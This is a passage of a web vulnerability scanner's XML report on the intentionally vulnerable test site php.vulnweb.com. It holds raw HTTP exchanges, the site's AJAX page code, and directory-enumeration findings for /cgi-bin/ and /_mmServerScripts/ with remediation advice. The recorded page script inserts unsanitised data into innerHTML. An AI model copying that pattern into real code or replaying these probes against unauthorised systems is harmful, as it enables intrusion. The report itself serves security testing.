			<a href="#" onclick="sendXML()">send xml</a> |
			<a href="#" onclick="SetMyCookie()">setcookie</a>
		</td>
  </tr>
  <tr>
    <td>
			<div id="contentDiv">
				&nbsp;
			</div>
		</td>
  </tr>
	<tr>
    <td>
			<div id="infoDiv">
				&nbsp;
			</div>
		</td>
  </tr>
	
	<tr>
    <td>
			<div id="xmlDiv">
				&nbsp;
			</div>
		</td>
  </tr>
</table>
</body>
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:29 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>4236</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="6F824A713A4A6A2C2F5D9AB63D42761A"><URL>http://php.vulnweb.com:80/AJAX/</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="6F824A713A4A6A2C2F5D9AB63D42761A"><![CDATA[GET /AJAX/ HTTP/1.1
Referer: http://php.vulnweb.com/AJAX/styles.css
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="6F824A713A4A6A2C2F5D9AB63D42761A";PSID="1E7419C2C0F90118E447E5EBA8FFAC1C";SessionType="PathTruncation";CrawlType="None";AttackType="None";OriginatingEngineID="398bfe9e-1b77-4458-9691-603eea06e341";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="0";Engine="Path+Truncation";SmartMode="4";tid="65";tt="44";
X-RequestManager-Memo: sid="31";smi="0";sc="1";ID="7a00ab08";
X-Request-Memo: ID="bf060590";sc="1";tid="41";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:46:06 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 4236

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>ajax test</title>
<link href="styles.css" rel="stylesheet" type="text/css" />
<script type="text/javascript">
	var httpreq = null;	

	function SetContent(XML) {
		var items = XML.getElementsByTagName('items').item(0).getElementsByTagName('item');
		var inner = '<ul>';
		for(i=0; i<items.length; i++){
			inner = inner + '<li><a href="javascript:getInfo(\'' + items[i].attributes.item(0).value + '\', \'' + items[i].attributes.item(1).value + '\')">' + items[i].firstChild.nodeValue + '</a></li>';
		}
		
		inner = inner + '</ul>'
		
		cd = document.getElementById('contentDiv');
		cd.innerHTML = inner;
		
		id = document.getElementById('infoDiv');
		id.innerHTML = '';
	}

	function httpCompleted() {
		if (httpreq.readyState==4 && httpreq.status==200) {						
			SetContent(httpreq.responseXML);
			httpreq = null;
		}		
	}
	
	function SetInfo(XML) {
		var ii = XML.getElementsByTagName('iteminfo').item(0);
		var inner = '';
		
		inner = inner + '<p><strong>' + ii.getElementsByTagName('name').item(0).firstChild.nodeValue + '</strong></p>';
		
		pict  = ii.getElementsByTagName('picture');
		if(pict.length>0){
			inner = inner + '<img src="../showimage.php?file=' + pict.item(0).firstChild.nodeValue + '"/>';
		}
		
		descs = ii.getElementsByTagName('description');
		for (i=0; i<descs.length; i++){
			inner = inner + '<p>' + descs.item(i).firstChild.nodeValue + '</p>';
		}
		
		id = document.getElementById('infoDiv');
		id.innerHTML = inner;
	}
	
	function httpInfoCompleted() {		
		if (httpreq.readyState==4 && httpreq.status==200) {
			SetInfo(httpreq.responseXML);
			httpreq = null;
		}		
	}
	
	function loadSomething(what) {			
		getHttpRequest();		
		httpreq.open('GET', what, true);		
		httpreq.send('');
	}
	
	function getInfo(where, which) {
		getHttpRequest();		
		httpreq.onreadystatechange = httpInfoCompleted;
		if (where=='infotitle'){
			httpreq.open('POST', where+'.php', true);
			httpreq.setRequestHeader('content-type', 'application/x-www-form-urlencoded');
			httpreq.send('id='+which);
		}
		else {
			httpreq.open('GET', where+'.php?id='+which, true);
			httpreq.send('');
		}
	}
	
	function xmlCompleted () {
		if (httpreq.readyState==4 && httpreq.status==200) {
			xd = document.getElementById('xmlDiv');
			xd.innerHTML = httpreq.responseText;
			httpreq = null;
		}	
	}
	
	function sendXML () {
		getHttpRequest();
		httpreq.onreadystatechange = xmlCompleted;
		httpreq.open('POST', 'showxml.php');
		httpreq.setRequestHeader('content-type', 'text/xml');
		httpreq.send('<xml><node name="nodename1">nodetext1</node><node name="nodename2">nodetext2</node></xml>');
	}
	
	function getHttpRequest() {
		// free the curent one
		if (httpreq!=null){
			httpreq.abort();
			httpreq = null;
		}		

    if( window.XMLHttpRequest ) {
			httpreq = new XMLHttpRequest();
			if (httpreq.overrideMimeType) {
					httpreq.overrideMimeType('text/xml');
			}
    } else if(ActiveXObject) {
     	httpreq = new ActiveXObject("Msxml2.XMLHTTP");
		}
			httpreq.onreadystatechange = httpCompleted;
	}
	
	function SetMyCookie() {
		document.cookie = "mycookie=3";
		alert('A cookie was set by JavaScript.');
	}
</script>
</head>
<body>
<table border="0" cellpadding="3" width="500" align="center">
  <tr>
    <td class="bordered">
			<a href="javascript:loadSomething('artists.php');">artists</a> |
			<a href="javascript:loadSomething('categories.php');">categories</a> | 
			<a href="#" onclick="loadSomething('titles.php')">titles</a> |
			<a href="#" onclick="sendXML()">send xml</a> |
			<a href="#" onclick="SetMyCookie()">setcookie</a>
		</td>
  </tr>
  <tr>
    <td>
			<div id="contentDiv">
				&nbsp;
			</div>
		</td>
  </tr>
	<tr>
    <td>
			<div id="infoDiv">
				&nbsp;
			</div>
		</td>
  </tr>
	
	<tr>
    <td>
			<div id="xmlDiv">
				&nbsp;
			</div>
		</td>
  </tr>
</table>
</body>
</html>
]]></RawResponse><Request id="6F824A713A4A6A2C2F5D9AB63D42761A"><Method>GET</Method><Path>/AJAX/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/AJAX/styles.css</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="6F824A713A4A6A2C2F5D9AB63D42761A";PSID="1E7419C2C0F90118E447E5EBA8FFAC1C";SessionType="PathTruncation";CrawlType="None";AttackType="None";OriginatingEngineID="398bfe9e-1b77-4458-9691-603eea06e341";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="0";Engine="Path+Truncation";SmartMode="4";tid="65";tt="44";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="31";smi="0";sc="1";ID="7a00ab08";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="bf060590";sc="1";tid="41";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>ajax test</title>
<link href="styles.css" rel="stylesheet" type="text/css" />
<script type="text/javascript">
	var httpreq = null;	

	function SetContent(XML) {
		var items = XML.getElementsByTagName('items').item(0).getElementsByTagName('item');
		var inner = '<ul>';
		for(i=0; i<items.length; i++){
			inner = inner + '<li><a href="javascript:getInfo(\'' + items[i].attributes.item(0).value + '\', \'' + items[i].attributes.item(1).value + '\')">' + items[i].firstChild.nodeValue + '</a></li>';
		}
		
		inner = inner + '</ul>'
		
		cd = document.getElementById('contentDiv');
		cd.innerHTML = inner;
		
		id = document.getElementById('infoDiv');
		id.innerHTML = '';
	}

	function httpCompleted() {
		if (httpreq.readyState==4 && httpreq.status==200) {						
			SetContent(httpreq.responseXML);
			httpreq = null;
		}		
	}
	
	function SetInfo(XML) {
		var ii = XML.getElementsByTagName('iteminfo').item(0);
		var inner = '';
		
		inner = inner + '<p><strong>' + ii.getElementsByTagName('name').item(0).firstChild.nodeValue + '</strong></p>';
		
		pict  = ii.getElementsByTagName('picture');
		if(pict.length>0){
			inner = inner + '<img src="../showimage.php?file=' + pict.item(0).firstChild.nodeValue + '"/>';
		}
		
		descs = ii.getElementsByTagName('description');
		for (i=0; i<descs.length; i++){
			inner = inner + '<p>' + descs.item(i).firstChild.nodeValue + '</p>';
		}
		
		id = document.getElementById('infoDiv');
		id.innerHTML = inner;
	}
	
	function httpInfoCompleted() {		
		if (httpreq.readyState==4 && httpreq.status==200) {
			SetInfo(httpreq.responseXML);
			httpreq = null;
		}		
	}
	
	function loadSomething(what) {			
		getHttpRequest();		
		httpreq.open('GET', what, true);		
		httpreq.send('');
	}
	
	function getInfo(where, which) {
		getHttpRequest();		
		httpreq.onreadystatechange = httpInfoCompleted;
		if (where=='infotitle'){
			httpreq.open('POST', where+'.php', true);
			httpreq.setRequestHeader('content-type', 'application/x-www-form-urlencoded');
			httpreq.send('id='+which);
		}
		else {
			httpreq.open('GET', where+'.php?id='+which, true);
			httpreq.send('');
		}
	}
	
	function xmlCompleted () {
		if (httpreq.readyState==4 && httpreq.status==200) {
			xd = document.getElementById('xmlDiv');
			xd.innerHTML = httpreq.responseText;
			httpreq = null;
		}	
	}
	
	function sendXML () {
		getHttpRequest();
		httpreq.onreadystatechange = xmlCompleted;
		httpreq.open('POST', 'showxml.php');
		httpreq.setRequestHeader('content-type', 'text/xml');
		httpreq.send('<xml><node name="nodename1">nodetext1</node><node name="nodename2">nodetext2</node></xml>');
	}
	
	function getHttpRequest() {
		// free the curent one
		if (httpreq!=null){
			httpreq.abort();
			httpreq = null;
		}		

    if( window.XMLHttpRequest ) {
			httpreq = new XMLHttpRequest();
			if (httpreq.overrideMimeType) {
					httpreq.overrideMimeType('text/xml');
			}
    } else if(ActiveXObject) {
     	httpreq = new ActiveXObject("Msxml2.XMLHTTP");
		}
			httpreq.onreadystatechange = httpCompleted;
	}
	
	function SetMyCookie() {
		document.cookie = "mycookie=3";
		alert('A cookie was set by JavaScript.');
	}
</script>
</head>
<body>
<table border="0" cellpadding="3" width="500" align="center">
  <tr>
    <td class="bordered">
			<a href="javascript:loadSomething('artists.php');">artists</a> |
			<a href="javascript:loadSomething('categories.php');">categories</a> | 
			<a href="#" onclick="loadSomething('titles.php')">titles</a> |
			<a href="#" onclick="sendXML()">send xml</a> |
			<a href="#" onclick="SetMyCookie()">setcookie</a>
		</td>
  </tr>
  <tr>
    <td>
			<div id="contentDiv">
				&nbsp;
			</div>
		</td>
  </tr>
	<tr>
    <td>
			<div id="infoDiv">
				&nbsp;
			</div>
		</td>
  </tr>
	
	<tr>
    <td>
			<div id="xmlDiv">
				&nbsp;
			</div>
		</td>
  </tr>
</table>
</body>
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:46:06 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>4236</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="C53479B340DA0C2AD1EC525E4BD06B59"><URL>http://php.vulnweb.com:80/cgi-bin/</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="82c5ad91-c244-4290-8265-bd48ef45a733"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>10</EngineType><AttackHTTPRequest><![CDATA[GET /cgi-bin/ HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="C53479B340DA0C2AD1EC525E4BD06B59";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="ae34b422-6357-4aca-8fe7-7e449e14c9b7";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10212";Engine="Directory+Enumeration";SmartMode="4";tid="17";tt="11";
X-RequestManager-Memo: sid="43";smi="0";sc="1";ID="e8783f73";
X-Request-Memo: ID="9dcc10dc";sc="1";tid="47";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>10212</VulnerabilityID><Severity>1</Severity><Name>CGI and Scripting-Related Directories</Name><Classifications><Classification kind="7PK" identifier="Environment" href="https://vulncat.fortify.com/">Environment</Classification><Classification kind="7PK Category" identifier="Web Server Misconfiguration: Unprotected Directory" href="https://vulncat.fortify.com/">Web Server Misconfiguration: Unprotected Directory</Classification><Classification kind="CWE" identifier="CWE-552" href="https://cwe.mitre.org/data/definitions/552.html">CWE-552: Files or Directories Accessible to External Parties</Classification></Classifications><DetectionSelection><Location offset="9" length="3" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Directory Enumeration vulnerabilities were discovered within your web application. Risks associated with an attacker discovering a directory on your application server depend upon what type of directory is discovered, and what types of files are contained within it.  The primary threat, other than accessing files containing sensitive information, is that an attacker can utilize the information discovered in that directory to perform other types of attacks.  Recommendations include restricting access to important directories or files by adopting a "need to know" requirement for both the document and server root, and turning off features such as Automatic Directory Listings that provide information that could be utilized by an attacker when formulating or conducting an attack. ]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Security Operations:</b><br />
You should evaluate the production requirements for the found directory.  If the directory is not required for production operation, then the directory and its contents should be removed or restricted by a server access control mechanism.  More information about implementing access control schemes can be found in the References.  Automatic directory indexing should also be disabled, if applicable.

<br /><br /><b>For Development:</b><br />
This problem will be resolved by the web application server administrator.  In general, do not rely on 'hidden' directories within the web root that can contain sensitive resources or web applications.  Assume an attacker knows about the existence of all directories and files on your web site, and protect them with proper access controls.

<br /><br /><b>For QA:</b><br />
This problem will be resolved by the web application  server administrator.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Implementing Basic Authentication in IIS</b><br /><a href="http://www.microsoft.com/technet/prodtechnol/WindowsServer2003/Library/IIS/abbca505-6f63-4267-aac1-1ea89d861eb4.mspx">http://www.microsoft.com/technet/prodtechnol/WindowsServer2003/Library/IIS/a

bbca505-6f63-4267-aac1-1ea89d861eb4.mspx</a><br /><br /><b>Implementing Basic Authentication in Apache</b><br /><a href="http://httpd.apache.org/docs/howto/auth.html#intro">http://httpd.apache.org/docs/howto/auth.html#intro</a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="C53479B340DA0C2AD1EC525E4BD06B59"><![CDATA[GET /cgi-bin/ HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="C53479B340DA0C2AD1EC525E4BD06B59";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="ae34b422-6357-4aca-8fe7-7e449e14c9b7";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10212";Engine="Directory+Enumeration";SmartMode="4";tid="17";tt="11";
X-RequestManager-Memo: sid="43";smi="0";sc="1";ID="e8783f73";
X-Request-Memo: ID="9dcc10dc";sc="1";tid="47";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 403 Forbidden
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:56 GMT
Server: nginx/1.19.0
X-Cache: MISS from 189.9.60.27
Connection: keep-alive
Content-Type: text/html; charset=iso-8859-1
Content-Length: 276

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.46 (Ubuntu) Server at localhost Port 8000</address>
</body></html>
]]></RawResponse><Request id="C53479B340DA0C2AD1EC525E4BD06B59"><Method>GET</Method><Path>/cgi-bin/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="C53479B340DA0C2AD1EC525E4BD06B59";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="ae34b422-6357-4aca-8fe7-7e449e14c9b7";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10212";Engine="Directory+Enumeration";SmartMode="4";tid="17";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="43";smi="0";sc="1";ID="e8783f73";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="9dcc10dc";sc="1";tid="47";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>403</StatusCode><StatusDescription>Forbidden</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.46 (Ubuntu) Server at localhost Port 8000</address>
</body></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:56 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>X-Cache</Name><Value>MISS from 189.9.60.27</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=iso-8859-1</Value></Header><Header><Name>Content-Length</Name><Value>276</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="1E7419C2C0F90118E447E5EBA8FFAC1C"><URL>http://php.vulnweb.com:80/AJAX/styles.css</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="1E7419C2C0F90118E447E5EBA8FFAC1C"><![CDATA[GET /AJAX/styles.css HTTP/1.1
Referer: http://php.vulnweb.com/AJAX/index.php
Host: php.vulnweb.com
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: ScriptEngine="Gecko";Category="Crawl";SID="1E7419C2C0F90118E447E5EBA8FFAC1C";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="ScriptInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="59a8eb88";
X-Request-Memo: ID="1759c09f";sc="1";tid="54";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:30 GMT
ETag: "4dca64a4-232"
Server: nginx/1.19.0
X-Cache: MISS from 189.9.60.27
Connection: keep-alive
Content-Type: text/css
Accept-Ranges: bytes
Last-Modified: Wed, 11 May 2011 10:27:48 GMT
Content-Length: 562

body {
  font-family: Verdana, Geneva, Arial, helvetica, sans-serif;
}

td {
	font-family: Verdana, Geneva, Arial, helvetica, sans-serif;
}

th {
	font-family: Verdana, Geneva, Arial, helvetica, sans-serif;
}

a {
	text-decoration: none;
	color:#333333;
}

a:hover {
	background-color: #FFEE00;
}

td.bordered {
	border: 1px solid #CCCCCC;
	background:#FFCC00;
}

#contentDiv {
	border: 1px solid #CCCCCC;
}

#xmlDiv {
	font-family: "Courier New", Courier, mono;
	font-size: 12px;
	color: #33CC00;
	background-color: #000000;
}]]></RawResponse><Request id="1E7419C2C0F90118E447E5EBA8FFAC1C"><Method>GET</Method><Path>/AJAX/</Path><File>styles</File><Ext>css</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/AJAX/index.php</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Accept-Language</Name><Value>en-US,en;q=0.5</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>ScriptEngine="Gecko";Category="Crawl";SID="1E7419C2C0F90118E447E5EBA8FFAC1C";PSID="3026F6CC91D501DA041B989F5755DF90";SessionType="Crawl";CrawlType="ScriptInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="59a8eb88";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="1759c09f";sc="1";tid="54";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[body {
  font-family: Verdana, Geneva, Arial, helvetica, sans-serif;
}

td {
	font-family: Verdana, Geneva, Arial, helvetica, sans-serif;
}

th {
	font-family: Verdana, Geneva, Arial, helvetica, sans-serif;
}

a {
	text-decoration: none;
	color:#333333;
}

a:hover {
	background-color: #FFEE00;
}

td.bordered {
	border: 1px solid #CCCCCC;
	background:#FFCC00;
}

#contentDiv {
	border: 1px solid #CCCCCC;
}

#xmlDiv {
	font-family: "Courier New", Courier, mono;
	font-size: 12px;
	color: #33CC00;
	background-color: #000000;
}]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:30 GMT</Value></Header><Header><Name>ETag</Name><Value>"4dca64a4-232"</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>X-Cache</Name><Value>MISS from 189.9.60.27</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/css</Value></Header><Header><Name>Accept-Ranges</Name><Value>bytes</Value></Header><Header><Name>Last-Modified</Name><Value>Wed, 11 May 2011 10:27:48 GMT</Value></Header><Header><Name>Content-Length</Name><Value>562</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="A1CEE9CF6012D777107AAAB260D61287"><URL>http://php.vulnweb.com:80/_mmServerScripts/</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="a121bbd9-358b-4bd3-b134-0ee9ee7435b2"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>10</EngineType><AttackHTTPRequest><![CDATA[GET /_mmServerScripts/ HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="A1CEE9CF6012D777107AAAB260D61287";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="ae34b422-6357-4aca-8fe7-7e449e14c9b7";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10214";Engine="Directory+Enumeration";SmartMode="4";tid="17";tt="11";
X-RequestManager-Memo: sid="41";smi="0";sc="1";ID="f8ef25ec";
X-Request-Memo: ID="9fcd99fc";sc="1";tid="46";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>10214</VulnerabilityID><Severity>1</Severity><Name>Common Web Site Structure Directories</Name><Classifications><Classification kind="7PK" identifier="Environment" href="https://vulncat.fortify.com/">Environment</Classification><Classification kind="7PK Category" identifier="Web Server Misconfiguration: Unprotected Directory" href="https://vulncat.fortify.com/">Web Server Misconfiguration: Unprotected Directory</Classification><Classification kind="CWE" identifier="CWE-552" href="https://cwe.mitre.org/data/definitions/552.html">CWE-552: Files or Directories Accessible to External Parties</Classification></Classifications><DetectionSelection><Location offset="9" length="3" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Directory Enumeration vulnerabilities were discovered within your web application. Risks associated with an attacker discovering a directory on your application server depend upon what type of directory is discovered, and what types of files are contained within it.  The primary threat, other than accessing files containing sensitive information, is that an attacker can utilize the information discovered in that directory to perform other types of attacks.  Recommendations include restricting access to important directories or files by adopting a "need to know" requirement for both the document and server root, and turning off features such as Automatic Directory Listings that provide information that could be utilized by an attacker when formulating or conducting an attack. ]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Security Operations:</b><br />
You should evaluate the production requirements for the found directory.  If the directory is not required for production operation, then the directory and its contents should be removed or restricted by a server access control mechanism.  More information about implementing access control schemes can be found in the References.  Automatic directory indexing should also be disabled, if applicable.

